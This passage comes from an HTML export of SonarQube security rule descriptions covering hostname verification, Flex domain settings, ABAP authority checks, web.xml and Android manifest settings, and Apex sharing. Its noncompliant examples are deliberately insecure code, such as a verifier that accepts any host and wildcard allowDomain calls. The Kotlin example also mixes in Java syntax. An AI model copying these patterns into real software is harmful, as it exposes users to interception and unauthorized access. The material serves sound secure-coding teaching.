<p>The hostname validation gets disabled by overriding <code>javax.net.ssl.HostnameVerifier.verify()</code> with an empty implementation. It is highly
recommended to use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLSession
import javax.net.ssl.HostnameVerifier
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

fun request() {
    val builder = OkHttpClient.Builder()
    builder.hostnameVerifier(object : HostnameVerifier {
      override fun verify(hostname: String?, session: SSLSession?): Boolean { // Noncompliant
        return true
      }
    })

    OkHttpClient client = builder.build()

    Request request = new Request.Builder()
            .url("https://example.com")
            .build()

    Response response = client.newCall(request).execute()
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLSession
import javax.net.ssl.HostnameVerifier
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

fun request() {
    val builder = OkHttpClient.Builder()

    OkHttpClient client = builder.build()

    Request request = new Request.Builder()
            .url("https://example.com")
            .build()

    Response response = client.newCall(request).execute()
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/297">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li>
  <li> <a
  href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1466">
              flex:S1466
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The Security.exactSettings value should remain set at the default value of true. Setting this value to false could make the SWF vulnerable to
cross-domain attacks.</p>
<h3>Noncompliant code example</h3>
<pre>
Security.exactSettings = false;
</pre>
<h3>Compliant solution</h3>
<pre>
Security.exactSettings = true;
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1465">
              flex:S1465
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A <code>LocalConnection</code> object is used to invoke a method in another <code>LocalConnection</code> object, either within a single SWF file or
between multiple SWF files. This kind of local connection should be authorized only when the origin (domain) of the other Flex applications is
perfectly defined.</p>
<h3>Noncompliant code example</h3>
<pre>
localConnection.allowDomain("*");
</pre>
<h3>Compliant solution</h3>
<pre>
localConnection.allowDomain("www.myDomain.com");
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1468">
              flex:S1468
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Calling Security.allowDomain("*") lets any domain cross-script into the domain of this SWF and exercise its functionality.</p>
<h3>Noncompliant code example</h3>
<pre>
Security.allowDomain("*");
</pre>
<h3>Compliant solution</h3>
<pre>
Security.allowDomain("www.myDomain.com");
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1951">
              flex:S1951
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=flex%3AS4507&rule_key=flex%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player. Because sensitive
information could easily be exposed in this manner, <code>trace()</code> should never appear in production code.</p>
<h3>Noncompliant code example</h3>
<pre>
    var val:Number = doCalculation();
    trace("Calculation result: " + val);  // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
    var val:Number = doCalculation();
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=flex:S1442">
              flex:S1442
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=flex%3AS4507&rule_key=flex%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p><code>Alert.show(...)</code> can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive
information to attackers, and should never be displayed.</p>
<h3>Noncompliant code example</h3>
<pre>
if (unexpectedCondition)
{
  Alert.show("Unexpected Condition");
}
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S5117">
              abap:S5117
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Every <code>AUTHORITY-CHECK</code> statement sets the fields <code>SY-SUBRC</code> (also accessible as <code>SYST-SUBRC</code>) to the
authorization check result. Thus <code>SY-SUBRC</code> value should be checked just after every <code>AUTHORITY-CHECK</code> statement.</p>
<h3>Noncompliant code example</h3>
<pre>
AUTHORITY-CHECK OBJECT 'S_MYOBJ' "Noncompliant
    ID 'ID1' FIELD myvalue.
</pre>
<h3>Compliant solution</h3>
<pre>
AUTHORITY-CHECK OBJECT 'S_MYOBJ'  "Compliant
    ID 'ID1' FIELD myvalue.

  IF sy-subrc &lt;&gt; 0.
    MESSAGE 'NOT AUTHORIZED' TYPE 'E'.
  ENDIF.
</pre>
<h3>Exceptions</h3>
<p>No issue will be raised in the following cases:</p>
<ul>
  <li> One or more <code>WRITE</code> operation are performed between the <code>AUTHORITY-CHECK</code> statement and <code>SY-SUBRC</code> check. An
  exception will be however raised if the <code>WRITE</code> operation is a <code>WRITE ... TO</code> statement, as this will set again
  <code>SY-SUBRC</code>. </li>
  <li> <code>SY-SUBRC</code>'s value is assigned to a variable. We then assume that it will be checked later. </li>
</ul>
<pre>
AUTHORITY-CHECK OBJECT 'S_MYOBJ'  "Compliant
    ID 'ID1' FIELD myvalue.
WRITE 'Test' " WRITE is accepted before checking SY-SUBRC
IF SY-SUBRC &lt;&gt; 0.
    EXIT.
ENDIF.

AUTHORITY-CHECK OBJECT 'S_MYOBJ'  "Compliant
    ID 'ID1' FIELD myvalue.
Tmp = SY-SUBRC " Assigning SY-SUBRC value to a variable. We assume that it will be checked later.
IF Tmp &lt;&gt; 0.
    EXIT.
ENDIF.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1674">
              abap:S1674
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Leaving a <code>CATCH</code> block empty means that the exception in question is neither handled nor passed forward to callers for handling at a
higher level. Suppressing errors rather than handling them could lead to unpredictable system behavior and should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
  try.
    if ABS( NUMBER ) &gt; 100.
      write / 'Number is large'.
    endif.
    catch CX_SY_ARITHMETIC_ERROR into OREF.
  endtry.
</pre>
<h3>Compliant solution</h3>
<pre>
  try.
    if ABS( NUMBER ) &gt; 100.
      write / 'Number is large'.
    endif.
  catch CX_SY_ARITHMETIC_ERROR into OREF.
    write / OREF-&gt;GET_TEXT( ).
  endtry.
</pre>
<h3>Exceptions</h3>
<p>When a block contains a comment, it is not considered to be empty.</p>
<h2>Resources</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/391">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S5115">
              abap:S5115
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Checking logged users' permissions by comparing their name to a hardcoded string can create security vulnerabilities. It prevents system
administrators from changing users' permissions when needed (example: when their account has been compromised). Thus system fields
<code>SY-UNAME</code> and <code>SYST-UNAME</code> should not be compared to hardcoded strings. Use instead <code>AUTHORITY-CHECK</code> to check
users' permissions.</p>
<p>This rule raises an issue when either of the system fields <code>SY-UNAME</code> or <code>SYST-UNAME</code> are compared to a hardcoded value in a
<code>CASE</code> statement or using one of the following operators: <code>=</code>, <code>EQ</code>, <code>&lt;&gt;</code>, <code>NE</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
IF SY-UNAME = 'ALICE'. " Noncompliant
ENDIF.

CASE SY-UNAME.
WHEN 'A'. " Noncompliant
ENDCASE.
</pre>
<h3>Compliant solution</h3>
<pre>
AUTHORITY-CHECK OBJECT 'S_CARRID'
  ID 'CARRID' FIELD mycarrid.
IF sy-subrc &lt;&gt; 0.
  MESSAGE 'Not authorized' TYPE 'E'.
ENDIF.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1486">
              abap:S1486
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A <code>BREAK-POINT</code> statement is used when debugging an application with help of the ABAP Debugger. But such debugging statements could make
an application vulnerable to attackers, and should not be left in the source code.</p>
<h3>Noncompliant code example</h3>
<pre>
IF wv_parallel EQ 'X'.
  BREAK-POINT.
  WAIT UNTIL g_nb_return EQ wv_nb_call.
ENDIF.
</pre>
<h3>Compliant solution</h3>
<pre>
IF wv_parallel EQ 'X'.
  WAIT UNTIL g_nb_return EQ wv_nb_call.
ENDIF.
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3355">
              xml:S3355
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not
invoked.</p>
<h3>Noncompliant code example</h3>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;

  &lt;filter-mapping&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3374">
              xml:S3374
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>According to the Common Weakness Enumeration,</p>
<blockquote>
  <p>If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards
  the other. This decision might not correspond to the programmer’s expectations…​</p>
</blockquote>
<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>
<h3>Noncompliant code example</h3>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
&lt;form-validation&gt;
  &lt;formset&gt;
    &lt;form name="BookForm"&gt; ... &lt;/form&gt;
  &lt;/formset&gt;
&lt;/form-validation&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/102">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation">OWASP, Improper Data Validation</a> - Struts: Duplicate
  Validation Forms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S2647">
              xml:S2647
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Basic authentication’s only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used.</p>
<h3>Noncompliant code example</h3>
<pre>
// in web.xml
&lt;web-app  ...&gt;
  &lt;!--  ...  --&gt;
  &lt;login-config&gt;
    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;
  &lt;/login-config&gt;
&lt;/web-app&gt;
</pre>
<h3>Exceptions</h3>
<p>The rule will not raise any issue if HTTPS is enabled, on any URL-pattern.</p>
<pre>
&lt;web-app  ...&gt;
  &lt;!--  ...  --&gt;
  &lt;security-constraint&gt;
    &lt;web-resource-collection&gt;
      &lt;web-resource-name&gt;HTTPS enabled&lt;/web-resource-name&gt;
      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
    &lt;/web-resource-collection&gt;
    &lt;user-data-constraint&gt;
      &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;
    &lt;/user-data-constraint&gt;
  &lt;/security-constraint&gt;
&lt;/web-app&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication">OWASP Web Service Security
  Cheat Sheet</a> </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/522">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5594">
              xml:S5594
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Once an Android component has been exported, it can be used by attackers to launch malicious actions and might also give access to other components
that are not exported.</p>
<p>As a result, sensitive user data can be stolen, and components can be launched unexpectedly.</p>
<p>For this reason, the following components should be protected:</p>
<ul>
  <li> Providers </li>
  <li> Activities </li>
  <li> Activity-aliases </li>
  <li> Services </li>
</ul>
<p>To do so, it is recommended to either set <code>exported</code> to <code>false</code>, add <code>android:readPermission</code> and
<code>android:writePermission</code> attributes, or add a <code>&lt;permission&gt;</code> tag.</p>
<p><strong>Warning</strong>: When targeting Android&nbsp;versions lower than 12, the presence of intent filters will cause <code>exported</code> to be
set to <code>true</code> by default.</p>
<p>If a component must be exported, use a <code>&lt;permission&gt;</code> tag and the <a
href="https://developer.android.com/guide/topics/manifest/permission-element#plevel">protection level</a> that matches your use case and data
confidentiality requirements.<br> For example, <a href="https://developer.android.com/training/sync-adapters">Sync adapters</a> should use a
<code>signature</code> protection level to remain both exported <strong>and</strong> protected.</p>
<h3>Noncompliant code example</h3>
<p>The following components are vulnerable because permissions are undefined or partially defined:</p>
<pre>
&lt;provider
  android:authorities="com.example.app.Provider"
  android:name="com.example.app.Provider"
  android:exported="true"
  android:readPermission="com.example.app.READ_PERMISSION" /&gt;  &lt;!-- Noncompliant: write permission is not defined --&gt;
</pre>
<pre>
&lt;provider
  android:authorities="com.example.app.Provider"
  android:name="com.example.app.Provider"
  android:exported="true"
  android:writePermission="com.example.app.WRITE_PERMISSION" /&gt;  &lt;!-- Noncompliant: read permission is not defined --&gt;
</pre>
<pre>
&lt;activity android:name="com.example.activity.Activity"&gt;  &lt;!-- Noncompliant: permissions are not defined --&gt;
  &lt;intent-filter&gt;
    &lt;action android:name="com.example.OPEN_UI"/&gt;
    &lt;category android:name="android.intent.category.DEFAULT"/&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</pre>
<h3>Compliant solution</h3>
<p>If the component’s capabilities or data are not intended to be shared with other apps, its <code>exported</code> attribute should be set to
<code>false</code>:</p>
<pre>
&lt;provider
  android:authorities="com.example.app.Provider"
  android:name="com.example.app.Provider"
  android:exported="false" /&gt;
</pre>
<p>Otherwise, implement permissions:</p>
<pre>
&lt;provider
  android:authorities="com.example.app.Provider"
  android:name="com.example.app.Provider"
  android:exported="true"
  android:readPermission="com.example.app.READ_PERMISSION"
  android:writePermission="com.example.app.WRITE_PERMISSION" /&gt;

&lt;activity android:name="com.example.activity.Activity"
          android:permission="com.example.app.PERMISSION" &gt;
  &lt;intent-filter&gt;
    &lt;action android:name="com.example.OPEN_UI"/&gt;
    &lt;category android:name="android.intent.category.DEFAULT" /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions">developer.android.com</a> - Implementing
  content provider permissions </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  platform usage </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/926">MITRE, CWE-926</a> - Improper Export of Android Application Components </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S6359">
              xml:S6359
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Defining a custom permission in the <code>android.permission</code> namespace may result in an unexpected permission assignment if a newer version
of Android adds a permission with the same name. It is recommended to use a namespace specific to the application for custom permissions.</p>
<h3>Noncompliant code example</h3>
<pre>
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.organization.app"&gt;

    &lt;permission
        android:name="android.permission.MYPERMISSION" /&gt; &lt;!-- Noncompliant --&gt;

&lt;/manifest&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.organization.app"&gt;

    &lt;permission
        android:name="com.organization.app.permission.MYPERMISSION" /&gt;

&lt;/manifest&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/265">MITRE, CWE-265</a> - Privilege Issues </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/732">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href="https://developer.android.com/guide/topics/permissions/defining">developer.android.com</a> - Define a Custom App Permission </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3281">
              xml:S3281
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated
as default.</p>
<p>This rule applies to projects that contain JEE Beans (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>,
<code>Stateless</code> or <code>Stateful</code>).</p>
<h3>Noncompliant code example</h3>
<pre>
// file: ejb-interceptors.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt; &lt;!-- should be declared in ejb-jar.xml --&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt; &lt;!-- Noncompliant; will NOT be treated as default --&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
// file: ejb-jar.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S5377">
              apex:S5377
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>By default Apex code executes without checking permissions. Hence the code will not enforce field level security, sharing rules and user
permissions during execution of Apex code in Triggers, Classes and Controllers. This creates the risk that unauthorized users may get access to
sensitive data records or fields.</p>
<p>To prevent this, developers should use <code>with sharing</code> keyword when declaring their classes if the class has SOQL or SOSL queries or DML
Statements. This will ensure that current user’s permissions, field level security and sharing rules are enforced during code execution. Thus users
will only see or modify records and fields which they have access to.</p>
<p>Use <code>without sharing</code> when a specific class should have full access to records without taking into account current user’s permissions.
This should be used very carefully.</p>
<p>Use <code>inherited sharing</code> when the code should inherit the level of access from the calling class. This is more secure than not specifying
a sharing level as the default will be equivalent to "with sharing".</p>
<p>This rule raises an issue when a class containing DML, SOSL or SOQL queries has no sharing level specified (<code>with sharing</code>,
<code>without sharing</code>, <code>inherited sharing</code>).</p>
<h3>Noncompliant code example</h3>
<pre>
public class MyClass { // Noncompliant, no sharing specified
  List&lt;Case&gt; lstCases = new List&lt;Case&gt;();
  for(Case c:[SELECT Id FROM Case WHERE Status = 'In Progress']){ // SOQL query
      // ...
  }
}

public class MyClass { // Noncompliant
  List&lt;List&lt;SObject&gt;&gt; sList = [FIND 'TEST' IN ALL FIELDS
                                      RETURNING Case(Name), Contact(FirstName,LastName)]; // SOSL query

}

public class MyClass { // Noncompliant
  List&lt;Case&gt; lstCases = new List&lt;Case&gt;();
  for(Case c:[SELECT Id, Status FROM Case WHERE Status = 'In Progress']){
      c.Status = 'Closed';
      lstCasesToBeUpdated.add(c);
  }
  Update lstCasesToBeUpdated;  // DML query
}
</pre>
<h3>Compliant solution</h3>
<pre>
public with sharing class MyClass {
  List&lt;Case&gt; lstCases = new List&lt;Case&gt;();
  for(Case c:[SELECT Id FROM Case WHERE Status = 'In Progress']){
      // ...
  }
}

public without sharing class MyClass {
  List&lt;List&lt;SObject&gt;&gt; sList = [FIND 'TEST' IN ALL FIELDS
                                      RETURNING Case(Name), Contact(FirstName,LastName)];
}

public inherited sharing class MyClass {
  List&lt;Case&gt; lstCases = new List&lt;Case&gt;();
  for(Case c:[SELECT Id, Status FROM Case WHERE Status = 'In Progress']){
      c.Status = 'Closed';
      lstCasesToBeUpdated.add(c);
  }
  Update lstCasesToBeUpdated;
}
</pre>
<h3>Exceptions</h3>
<p>No issue will be raised for test classes, i.e. classes annotated with <code>@isTest</code></p>
<h2>Resources</h2>
<ul>
  <li> <a href="https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_classes_keywords_sharing.htm">Using the with sharing,
  without sharing, and inherited sharing Keywords</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
      </tbody>
    </table>
    
  </div>

  
</body>

</html>